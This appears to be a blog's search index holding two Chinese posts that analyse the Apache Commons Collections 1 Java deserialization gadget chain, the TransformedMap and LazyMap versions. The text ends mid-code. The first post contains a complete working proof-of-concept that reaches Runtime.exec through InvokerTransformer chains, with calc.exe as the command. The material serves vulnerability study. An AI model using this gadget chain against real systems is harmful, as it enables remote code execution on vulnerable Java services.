<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>apache commons collections漏洞挖掘思路分析-TransformedMap版本</title>
    <url>/2021/09/26/cc1/</url>
    <content><![CDATA[<p>本篇主要分析commons collections漏洞挖掘思路，加深对反序列化漏洞原理的理解，部分细节不深究。</p>
<h2 id="java反序列化漏洞成功执行所需要的条件"><a href="#java反序列化漏洞成功执行所需要的条件" class="headerlink" title="java反序列化漏洞成功执行所需要的条件"></a>java反序列化漏洞成功执行所需要的条件</h2><p>入口点：即整个漏洞利用链的开端，入口点需要重写ObjectInputStream#readObejct()<br>       调用链：即能够把入口点和触发点串联起来的函数调用链<br>       触发点：即可执行具体命令的函数，需要自己查找</p>
<h2 id="定位触发点和入口点"><a href="#定位触发点和入口点" class="headerlink" title="定位触发点和入口点"></a>定位触发点和入口点</h2><p>首先需要确定触发点，再进行反推。在java中可以执行命令的常见方式有两种，一种是直接调用Runtime.getRuntime().exec()等命令执行的函数，第二种是利用反射对命令执行函数进行调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123; <span class="comment">// </span></span><br><span class="line">            <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 通过反射获取类名</span></span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                <span class="comment">// 获取方法名</span></span><br><span class="line">                Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">                <span class="comment">// 通过invoke进行方法调用</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>在InvokerTransformer#transform()中，可以看到通过反射调用了invoke()方法，只要能够传入Runtime对象即可进行命令执行，如下可以弹出计算器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformerDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">	<span class="comment">// 把Runtime对象当做参数传到InvokerTransformer构造函数</span></span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;).transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>所以首先可以确认InvokerTransformer#transform()为最终的触发点。</strong></p>
<p>Alt+F7查找哪个函数对InvokerTransformer#transform()进行了调用，因为有数十个调用关系，数量太多，只关注TransformedMap#checkSetValue()，如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// valueTransformer是Transformer类型的</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造方法前有protected，表示只能被自身调用</span></span><br><span class="line">    <span class="comment">// 可以看到上面的decorate()返回了TransformedMap构造函数</span></span><br><span class="line">    <span class="comment">// 所以使用TransformedMap#decorate()进行实例化，valueTransformer为可控点</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// valueTransformer此时为InvokerTransformer对象</span></span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>此时valueTransformer对应InvokerTransformer对象，继续查找哪里调用了TransformedMap#checkSetValue()，发现只有AbstractInputCheckedMapDecorator.MapEntry#setValue()这一处进行了调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> </span>&#123;</span><br><span class="line">    <span class="comment">// MapEntry为 内部类</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line">		</span><br><span class="line">        <span class="comment">// 内部类的构造方法</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(entry);</span><br><span class="line">            <span class="keyword">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续往上查找调用，找到了AnnotationInvocationHandler#readObject(),因为此处找到了AnnotationInvocationHandler继承了Serializable并且有重写readObjec()，所以可以作为入口点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 实例化需要传入Annotation类型参数，Map类型的参数,Map类型的参数可控</span></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">            <span class="keyword">this</span>.type = var1;</span><br><span class="line">            <span class="comment">// memberValues为Map</span></span><br><span class="line">            <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// getInstance会获取到@Retention的基本信息，包括注解元素，注解元素的默认值，生命周期，是否继承等等</span></span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//var3是var2的键值对类型</span></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        <span class="comment">// 迭代器，var4包含的键值对和memberValues一致</span></span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历memberValues的键值对</span></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            <span class="comment">// var5为单个键值对</span></span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            <span class="comment">// var6为键值对的key</span></span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            </span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            <span class="comment">// 需要满足判断条件才能满足setValue()调用</span></span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">// var5为单个键值对</span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在AnnotationInvocationHandler的构造函数中需要传入Annotation类型的参数和Map类型的参数，因为Annotation类型与命令执行无关，所以把Map类型的参数作为可控点。</p>
<p>因为AnnotationInvocationHandler是非public的，所以只能通过反射获取,获取到对象后再进行序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="comment">// </span></span><br><span class="line">Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 实例化AnnotationInvocationHandler对象，后续对handler进行序列化</span></span><br><span class="line">InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化</span></span><br><span class="line">ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream  oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line">oos.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line">System.out.println(barr);</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">Object o = (Object)ois.readObject();</span><br></pre></td></tr></table></figure>

<p>此时触发点和入口点都确认了，后续主要任务是要把两点串联</p>
<h2 id="串联触发点和入口点需要解决的关键问题"><a href="#串联触发点和入口点需要解决的关键问题" class="headerlink" title="串联触发点和入口点需要解决的关键问题"></a>串联触发点和入口点需要解决的关键问题</h2><h3 id="Runtime-getRuntime-无法反序列化"><a href="#Runtime-getRuntime-无法反序列化" class="headerlink" title="Runtime.getRuntime()无法反序列化"></a>Runtime.getRuntime()无法反序列化</h3><p>待序列化的对象和所有它使⽤的内部属性对象，必须都实现了 java.io.Serializable 接口。但是在最开始执行命令是使用的InvokerTransformer.transform(Runtime.getRuntime()),Runtime类并没有实现Serializable接口，所以不能被序列化操作。所以这里联想到Runtime.class,因为Runtime.class属于java.lang.Class，实现了Serializable，可以被序列化。</p>
<p>上文已经确认触发点为InvokerTransformer#transfor(),那如何获取Runtime.class并当做参数传入到InvokerTransformer#transform()呢？</p>
<p>此时需要借助ConstantTransformer和ChainedTransformer</p>
<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 实例化把constantToReturn赋给iConstant</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回iConstant，即执行transform()的时候返回实例化传入的对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过查看源码逻辑，ConstantTransformer逻辑很简单，调用ConstantTransformer#transform()的时候返回实例化传入的对象，可以通过ConstantTransformer#transform()获取Runtime.class，下面考虑如何把获取到的Runtime.class传入InvokerTransformer#transform()</p>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 传入Transformer[]数组进行实例化</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 对Transformer[]进行遍历，并且前一个返回当做后一个参数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通过查看代码，ChainedTransformer#transform()可以实现对多个Transformer实现类进行链式调用，可以用</p>
<p>ChainedTransformer把ConstantTransformer#transform()和InvokerTransformer#transform()进行关联，如下代码实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> String[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>

<p>那如何调用ChainedTransformer#transform()呢？把transformerChain作为传入TransformedMap#decorate(),赋值给valueTransformer，在调用TransformedMap#checkSetValue()时，就可以执行valueTransformer#transform(),进行链式调用，将ConstantTransformer#transform()和InvokerTransformer#transform()进行链式调用</p>
<h3 id="需要满足两个if才能进行调用setValue"><a href="#需要满足两个if才能进行调用setValue" class="headerlink" title="需要满足两个if才能进行调用setValue()"></a>需要满足两个if才能进行调用setValue()</h3><p>此处需要把TransformedMap修饰的Map的key设置为value，此处暂时不扣细节，可以参考其他师傅文章。如下实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="comment">// key必须设置为&quot;value&quot;</span></span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br></pre></td></tr></table></figure>



<h2 id="完整调用链"><a href="#完整调用链" class="headerlink" title="完整调用链"></a>完整调用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject() :反序列化入口</span><br><span class="line">            AnnotationInvocationHandler.readObject() <span class="comment">// 入口点，重写readObject()</span></span><br><span class="line"><span class="comment">// TransformedMap 继承 AbstractInputCheckedMapDecorator 继承 AbstractMapDecorator继承Map</span></span><br><span class="line"><span class="comment">// TransformedMap类中没有setValue(),所以调用父类AbstractInputCheckedMapDecorator中的MapEntry.setValue()</span></span><br><span class="line">               AbstractInputCheckedMapDecorator.MapEntry.setValue() </span><br><span class="line"><span class="comment">// Alt + F7(TransformedMap.checkSetValue()): 发现AbstractInputCheckedMapDecorator.MapEntry.setValue()调用TransformedMap.checkSetValue()</span></span><br><span class="line">                   TransformedMap.checkSetValue() </span><br><span class="line">    					  <span class="comment">// for循环遍历transforms中的transform</span></span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">    						  <span class="comment">// 获取Runtime()类</span></span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">    						 <span class="comment">// 获取getRuntime方法</span></span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">    						  <span class="comment">// 执行getRuntime方法实例化对象</span></span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">    						  <span class="comment">// 执行exec(),执行恶意操作</span></span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec() 执行点</span><br></pre></td></tr></table></figure>



<h2 id="最终poc"><a href="#最终poc" class="headerlink" title="最终poc"></a>最终poc</h2><p>就是把上述各个环节的代码实现串联</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class CommonsCollections1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new String[] &#123; &quot;calc.exe&quot; &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line"></span><br><span class="line">        // key必须设置为&quot;value&quot;</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        // 反射执行AnnotationInvocationHandler</span><br><span class="line">        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(true);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        // 序列化</span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream  oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过调试poc和思考cc1挖掘思路，对反序列化漏洞利用链的构造理解深入了一些，同时看源码的能力也有所提升。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></p>
<p><a href="https://xz.aliyun.com/t/7031">https://xz.aliyun.com/t/7031</a></p>
<p><a href="https://fynch3r.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92">https://fynch3r.github.io/Java反序列化利用链补全计划</a><br><a href="https://su18.org/post/ysuserial/https://hexo.io/docs/one-command-deployment.html">https://su18.org/post/ysuserial/https://hexo.io/docs/one-command-deployment.html</a>)</p>
<p><a href="https://mp.weixin.qq.com/s/thbxaE2KjG5x3QEAVPuBWg">https://mp.weixin.qq.com/s/thbxaE2KjG5x3QEAVPuBWg</a></p>
]]></content>
  </entry>
  <entry>
    <title>apache commons collections 漏洞分析-LazyMap版本</title>
    <url>/2021/09/28/cc1-lazymap/</url>
    <content><![CDATA[<p>本篇主要分析apache commons collections漏洞LazyMap利用链的构造思路</p>
<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>直接看调用链，与TransformedMap版本有重合，只关注从LazyMap.get()到AnnotationInvocationHandler.readObject()入口点这一段</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    </span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">    <span class="comment">// 动态代理执行任意方法触发AnnotationInvocationHandler.invoke()</span></span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">     <span class="comment">// 链构造过程需要寻找可控点，把LazyMap传入</span></span><br><span class="line">                        LazyMap.get()</span><br><span class="line">  ---------------------------------以下和TransformedMap链一样----------------------------------</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="LazyMap作用"><a href="#LazyMap作用" class="headerlink" title="LazyMap作用"></a>LazyMap作用</h2><p>在获取不到key的时候才会调用factory.transform(key)，所以构造的Map不能有key，factory可控，把ChainedTransformer赋给factory即可进行链式调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMap</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title">Map</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// poc中需要确保key不存在，能够进入下面的if代码块进行factory.transform(key)调用</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="comment">// factory可控，把ChainedTransformer赋给factory即可进行链式调用</span></span><br><span class="line">            Object value = factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="AnnotationInvocationHandler-invoke"><a href="#AnnotationInvocationHandler-invoke" class="headerlink" title="AnnotationInvocationHandler#invoke()"></a>AnnotationInvocationHandler#invoke()</h2><p>AnnotationInvocationHandler#invoke()调用了LazyMap#get(),查看其代码逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="comment">// memberValues为Map对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Method[] memberMethods = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实例化可以把LazyMap赋给var2</span></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">            <span class="keyword">this</span>.type = var1;</span><br><span class="line">            <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">        String var4 = var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span 